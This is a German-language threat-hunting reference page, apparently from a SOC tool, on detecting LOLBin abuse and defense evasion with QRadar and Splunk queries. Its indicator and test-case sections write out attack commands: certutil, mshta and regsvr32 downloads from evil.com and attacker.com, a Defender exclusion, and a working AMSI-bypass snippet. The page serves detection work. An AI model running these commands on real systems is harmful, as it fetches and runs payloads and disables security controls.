@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>SOC Ticket Tool — HUNT-005: LOLBins / Defense Evasion</title>
+<style>
+  :root{--bg:#0b0f1a;--bg-card:#131929;--bg-input:#0f1521;--border:#1e2d45;--accent:#00d4ff;--accent2:#00ff88;--warn:#ff6b35;--crit:#ff2d55;--purple:#9b59f5;--text:#c9d6e3;--text-dim:#5a6a80;--text-head:#e8f0f8;--font-mono:'JetBrains Mono','Courier New',monospace;--font-ui:'Segoe UI',system-ui,sans-serif;--sw:280px;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:var(--font-ui);font-size:14px;line-height:1.7;display:flex;min-height:100vh;}
+  #sidebar{width:var(--sw);min-width:var(--sw);background:var(--bg-card);border-right:1px solid var(--border);position:fixed;top:0;left:0;bottom:0;overflow-y:auto;padding:0 0 40px;}
+  #sidebar::-webkit-scrollbar{width:4px;}#sidebar::-webkit-scrollbar-thumb{background:var(--border);}
+  .sb-logo{padding:18px 16px 12px;border-bottom:1px solid var(--border);}
+  .sb-logo h1{font-size:12px;font-weight:700;color:var(--accent);letter-spacing:1px;text-transform:uppercase;}
+  .sb-logo p{font-size:11px;color:var(--text-dim);margin-top:2px;}
+  .sb-badge{display:inline-block;margin:10px 16px 0;font-size:10px;font-weight:700;padding:3px 10px;border-radius:12px;background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.3);color:var(--crit);letter-spacing:.5px;text-transform:uppercase;}
+  .sb-section{padding:12px 16px 4px;font-size:10px;font-weight:700;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;}
+  .sb-link{display:flex;align-items:center;gap:8px;padding:5px 16px;font-size:11px;color:var(--text);text-decoration:none;border-left:3px solid transparent;transition:all .15s;}
+  .sb-link:hover{background:rgba(0,212,255,.06);color:var(--text-head);}
+  .sb-link.active{border-left-color:var(--accent);background:rgba(0,212,255,.08);color:var(--accent);font-weight:600;}
+  .sb-link .hid{font-size:9px;font-weight:700;color:var(--text-dim);font-family:var(--font-mono);min-width:36px;flex-shrink:0;}
+  #content{margin-left:var(--sw);flex:1;padding:40px 50px 80px;max-width:1000px;}
+  .cover{margin-bottom:36px;padding-bottom:22px;border-bottom:1px solid var(--border);}
+  .hunt-id-cover{display:inline-block;font-family:var(--font-mono);font-size:11px;font-weight:700;padding:3px 10px;border-radius:3px;background:rgba(255,45,85,.12);border:1px solid rgba(255,45,85,.25);color:var(--crit);margin-bottom:8px;}
+  .cover h1{font-size:24px;font-weight:800;color:var(--text-head);letter-spacing:1px;}
+  .cover .meta{font-size:12px;color:var(--text-dim);margin-top:6px;}
+  .doc-section{margin-bottom:44px;}
+  h2{font-size:16px;font-weight:700;color:var(--accent);padding-bottom:8px;border-bottom:1px solid var(--border);margin-bottom:14px;}
+  h3{font-size:12px;font-weight:700;color:var(--text-head);margin:16px 0 6px;text-transform:uppercase;letter-spacing:.5px;}
+  p{margin-bottom:10px;color:var(--text);font-size:13px;}
+  pre{background:var(--bg-input);border:1px solid var(--border);border-radius:5px;padding:14px 16px;font-family:var(--font-mono);font-size:11px;line-height:1.7;color:#a8d8b0;overflow-x:auto;margin:6px 0 14px;white-space:pre;}
+  pre.qradar{border-left:3px solid var(--accent);}
+  pre.splunk{border-left:3px solid var(--warn);}
+  pre.sysmon{border-left:3px solid var(--accent2);}
+  .doc-table{width:100%;border-collapse:collapse;margin:6px 0 14px;font-size:12px;}
+  .doc-table th{background:rgba(0,212,255,.08);color:var(--accent);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;padding:7px 12px;text-align:left;border-bottom:1px solid var(--border);}
+  .doc-table td{padding:6px 12px;border-bottom:1px solid var(--border);color:var(--text);vertical-align:top;}
+  .doc-table tr:last-child td{border-bottom:none;}
+  .doc-table td:first-child{color:#8ec5d6;font-weight:600;font-size:11px;}
+  code{font-family:var(--font-mono);font-size:11px;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);border-radius:3px;padding:1px 5px;color:var(--accent);}
+  .back-link{display:inline-flex;align-items:center;gap:6px;color:var(--text-dim);text-decoration:none;font-size:12px;margin-bottom:22px;padding:5px 10px;border:1px solid var(--border);border-radius:4px;transition:all .15s;}
+  .back-link:hover{color:var(--accent);border-color:var(--accent);}
+  ul.dl{list-style:none;padding:0;margin:8px 0 14px;}
+  ul.dl li{padding:3px 0 3px 16px;position:relative;font-size:12px;color:var(--text);}
+  ul.dl li::before{content:'›';position:absolute;left:0;color:var(--accent);font-weight:700;}
+  ul.dl li.tp::before{content:'+';color:var(--accent2);}
+  ul.dl li.fp::before{content:'✗';color:var(--crit);}
+  ul.dl li.var::before{content:'~';color:var(--purple);}
+</style>
+</head>
+<body>
+<nav id="sidebar">
+  <div class="sb-logo"><h1>SOC Ticket Tool</h1><p>Hunt Reference</p></div>
+  <span class="sb-badge">🎯 Hunt Docs</span>
+  <div class="sb-section">Übersicht</div>
+  <a class="sb-link" href="index.html"><span class="hid">—</span> Alle Hunts</a>
+  <div class="sb-section">Defense Evasion</div>
+  <a class="sb-link active" href="hunt-005.html"><span class="hid">H-005</span> LOLBins / Evasion</a>
+  <div class="sb-section">Weitere Hunts</div>
+  <a class="sb-link" href="hunt-001.html"><span class="hid">H-001</span> C2 / Beaconing</a>
+  <a class="sb-link" href="hunt-002.html"><span class="hid">H-002</span> Credential Theft</a>
+  <a class="sb-link" href="hunt-003.html"><span class="hid">H-003</span> Lateral Movement</a>
+  <a class="sb-link" href="hunt-004.html"><span class="hid">H-004</span> Persistence</a>
+  <a class="sb-link" href="hunt-006.html"><span class="hid">H-006</span> Exfiltration / DNS</a>
+  <a class="sb-link" href="hunt-007.html"><span class="hid">H-007</span> Ransomware</a>
+  <a class="sb-link" href="hunt-008.html"><span class="hid">H-008</span> Privilege Escalation</a>
+  <a class="sb-link" href="hunt-009.html"><span class="hid">H-009</span> AD Enumeration</a>
+  <a class="sb-link" href="hunt-010.html"><span class="hid">H-010</span> Initial Access</a>
+</nav>
+<main id="content">
+  <a class="back-link" href="index.html">← Hunt-Übersicht</a>
+  <div class="cover">
+    <div class="hunt-id-cover">HUNT-005</div>
+    <h1>LOLBins / Defense Evasion</h1>
+    <div class="meta">MITRE: T1218.004 · T1218.005 · T1218.007 · T1218.010 · T1218.011 · T1059 · T1562.001 · T1562.006 &nbsp;|&nbsp; Taktik: Defense Evasion &nbsp;|&nbsp; Basis-Konfidenz: 60</div>
+  </div>
+
+  <section class="doc-section">
+    <h2>Beschreibung</h2>
+    <p>Living-off-the-Land Binaries (LOLBins) sind legitime Windows-Systemtools die von Angreifern missbraucht werden um Sicherheitslösungen zu umgehen. Da die Binaries signiert sind, erkennen viele AV-Lösungen den Missbrauch nicht.</p>
+    <p>Zusätzlich: AMSI-Bypass um PowerShell-Erkennung zu umgehen, ETW-Patching um Event-Logging zu deaktivieren, Defender-Exclusions hinzufügen.</p>
+  </section>
+
+  <section class="doc-section">
+    <h2>QRadar AQL</h2>
+    <h3>certutil.exe als Downloader/Decoder</h3>
+    <pre class="qradar">-- certutil.exe als Downloader/Decoder
+SELECT sourceip, username, ProcessName, CommandLine
+FROM events
+WHERE EventID = 4688
+  AND ProcessName ILIKE '%certutil%'
+  AND (CommandLine ILIKE '%-urlcache%'
+    OR CommandLine ILIKE '%-decode%'
+    OR CommandLine ILIKE '%-decodehex%'
+    OR CommandLine ILIKE '%http%'
+    OR CommandLine ILIKE '%ftp%')
+LAST 24 HOURS
+
+-- mshta.exe mit Remote-Inhalt
+SELECT sourceip, username, ProcessName, CommandLine
+FROM events
+WHERE EventID = 4688
+  AND ProcessName ILIKE '%mshta%'
+  AND (CommandLine ILIKE '%http%'
+    OR CommandLine ILIKE '%ftp%'
+    OR CommandLine ILIKE '%\\\\%'
+    OR CommandLine ILIKE '%javascript%'
+    OR CommandLine ILIKE '%vbscript%')
+LAST 24 HOURS
+
+-- regsvr32.exe Squiblydoo
+SELECT sourceip, username, ProcessName, CommandLine
+FROM events
+WHERE EventID = 4688
+  AND ProcessName ILIKE '%regsvr32%'
+  AND (CommandLine ILIKE '%/u%'
+    AND CommandLine ILIKE '%/i:%'
+    AND CommandLine ILIKE '%scrobj%')
+LAST 24 HOURS
+
+-- Defender Exclusion hinzufügen
+SELECT sourceip, username, ProcessName, CommandLine
+FROM events
+WHERE EventID = 4688
+  AND CommandLine ILIKE '%Add-MpPreference%'
+  AND CommandLine ILIKE '%-ExclusionPath%'
+LAST 24 HOURS</pre>
+  </section>
+
+  <section class="doc-section">
+    <h2>Splunk SPL</h2>
+    <pre class="splunk">-- LOLBins Commandline-Analyse via Sysmon Event 1
+index=sysmon EventCode=1
+| eval lolbin_type=case(
+    match(Image,"(?i)certutil\\.exe") AND match(CommandLine,"(?i)-urlcache|-decode"),"certutil Downloader",
+    match(Image,"(?i)mshta\\.exe") AND match(CommandLine,"(?i)http|javascript|vbscript"),"mshta Remote HTA",
+    match(Image,"(?i)regsvr32\\.exe") AND match(CommandLine,"(?i)/i:http.*scrobj"),"regsvr32 Squiblydoo",
+    match(Image,"(?i)rundll32\\.exe") AND match(CommandLine,"(?i)javascript:|.dll,#"),"rundll32 Abuse",
+    match(Image,"(?i)wmic\\.exe") AND match(CommandLine,"(?i)process call create"),"WMIC Process Create",
+    match(Image,"(?i)msiexec\\.exe") AND match(CommandLine,"(?i)/i http"),"msiexec Remote MSI",
+    match(Image,"(?i)bitsadmin\\.exe") AND match(CommandLine,"(?i)/transfer|/download"),"BITS Download",
+    1==1,null())
+| where isnotnull(lolbin_type)
+| table _time, ComputerName, User, Image, CommandLine, lolbin_type, ParentImage
+
+-- AMSI Bypass Erkennung
+index=sysmon EventCode=1
+| where match(CommandLine,"(?i)(AmsiScanBuffer|amsi\\.dll|amsi_result|AMSI_RESULT_NOT_DETECTED)")
+    OR match(CommandLine,"(?i)(\\[Runtime.InteropServices.Marshal\\]|VirtualProtect.*amsi)")
+| table _time, ComputerName, User, CommandLine</pre>
+  </section>
+
+  <section class="doc-section">
+    <h2>Sysmon / Windows Security Events</h2>
+    <pre class="sysmon">-- Sysmon Event 1: Prozess-Erstellung mit vollständiger CommandLine
+-- Wichtig: Sysmon muss CommandLine-Logging aktiviert haben!
+
+-- certutil Indikatoren:
+--   certutil.exe -urlcache -split -f http://evil.com/file
+--   certutil.exe -decode encoded.b64 output.exe
+
+-- mshta Indikatoren:
+--   mshta.exe http://evil.com/payload.hta
+--   mshta.exe vbscript:Execute(...)
+
+-- regsvr32 Squiblydoo:
+--   regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll
+--   → scrobj.dll ist signiert, führt aber beliebigen Code aus
+
+-- AMSI Bypass Patterns in PowerShell:
+--   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+--   .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</pre>
+  </section>
+
+  <section class="doc-section">
+    <h2>True Positives</h2>
+    <ul class="dl">
+      <li class="tp"><strong>certutil.exe -urlcache -split -f http://evil.com/payload.exe</strong> (Konfidenz: 92)</li>
+      <li class="tp"><strong>mshta.exe http://attacker.com/stage2.hta</strong> (Konfidenz: 90)</li>
+      <li class="tp"><strong>regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll</strong> (Konfidenz: 95)</li>
+      <li class="tp"><strong>Add-MpPreference -ExclusionPath C:\Users\Public</strong> (Konfidenz: 88)</li>
+      <li class="tp"><strong>AMSI Bypass: AmsiScanBuffer Patch in PowerShell</strong> (Konfidenz: 90)</li>
+      <li class="tp"><strong>wmic process call create "cmd.exe /c whoami"</strong> (Konfidenz: 80)</li>
+    </ul>
+  </section>
+
+  <section class="doc-section">
+    <h2>False Positives &amp; Whitelist</h2>
+    <ul class="dl">
+      <li class="fp"><strong>Legitimes certutil für Zertifikat-Operationen</strong> — certutil -addstore. Whitelist: Operationen ohne HTTP/decode</li>
+      <li class="fp"><strong>IT-Admin WMIC für Fernverwaltung</strong> — Whitelist: bekannte Admin-Hosts</li>
+      <li class="fp"><strong>Software-Deployment via msiexec</strong> — Whitelist: bekannte MSI-URLs/Hashes</li>
+      <li class="fp"><strong>Enterprise AV die regsvr32 für Registrierung nutzt</strong> — Whitelist: bekannte Vendor-Pfade</li>
+    </ul>
+  </section>
+
+  <section class="doc-section">
+    <h2>Varianten &amp; Evasion-Techniken</h2>
+    <ul class="dl">
+      <li class="var"><strong>VAR-001: Umbenennen von LOLBins</strong> (Conf-Modifier: -15) — certutil.exe → svchost32.exe, aber Commandline-Pattern bleibt gleich</li>
+      <li class="var"><strong>VAR-002: xwizard.exe / odbcconf.exe</strong> (Conf-Modifier: -20) — Seltenere LOLBins die weniger bekannt sind</li>
+      <li class="var"><strong>VAR-003: PowerShell Constrained Language Mode Bypass</strong> (Conf-Modifier: -10) — Umgehung via Downgrade auf PS v2</li>
+      <li class="var"><strong>VAR-004: ETW Patching</strong> (Conf-Modifier: -30) — Event-Logging deaktiviert, kaum erkennbar ohne Endpoint-Monitoring</li>
+    </ul>
+  </section>
+
+  <section class="doc-section">
+    <h2>Test Cases</h2>
+    <table class="doc-table">
+      <thead><tr><th>ID</th><th>Typ</th><th>Beschreibung</th><th>Erwartet</th><th>Min. Conf.</th></tr></thead>
+      <tbody>
+        <tr><td>TP-001</td><td>TP</td><td>certutil -urlcache -f http://evil.com</td><td>Erkannt</td><td>92</td></tr>
+        <tr><td>TP-002</td><td>TP</td><td>mshta.exe http://attacker.com/payload.hta</td><td>Erkannt</td><td>90</td></tr>
+        <tr><td>TP-003</td><td>TP</td><td>regsvr32 Squiblydoo (scrobj.dll)</td><td>Erkannt</td><td>95</td></tr>
+        <tr><td>TP-004</td><td>TP</td><td>Add-MpPreference -ExclusionPath</td><td>Erkannt</td><td>88</td></tr>
+        <tr><td>FP-001</td><td>FP</td><td>certutil -addstore (Zertifikat)</td><td>NICHT erkannt</td><td>—</td></tr>
+        <tr><td>FP-002</td><td>FP</td><td>WMIC von bekanntem Admin-Host</td><td>NICHT erkannt</td><td>—</td></tr>
+        <tr><td>VAR-001</td><td>VAR</td><td>Umbenanntes certutil (Commandline-Pattern)</td><td>Erkannt</td><td>77</td></tr>
+        <tr><td>VAR-003</td><td>VAR</td><td>PowerShell v2 Downgrade</td><td>Erkannt</td><td>60</td></tr>
+      </tbody>
+    </table>
+  </section>
+</main>
+</body>
+</html>
